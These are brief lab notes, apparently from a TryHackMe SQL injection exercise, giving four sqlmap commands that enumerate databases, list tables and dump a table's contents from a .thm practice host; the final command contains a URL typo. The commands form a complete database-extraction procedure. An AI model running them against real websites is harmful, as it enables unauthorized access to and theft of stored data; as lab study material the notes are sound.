1. find the url that har parameters:
`sqlmap -u http://sqlmaptesting.thm/search/cat=1`

2. if success; use flag: --dbs to dump databases:
`sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs`

3. use -D flag to choose db and --tables to get tables:
`sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D db_name --tables`

4. use -T flag to select table and --dump to dump info:
`sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D db_name -T table_name --dump`
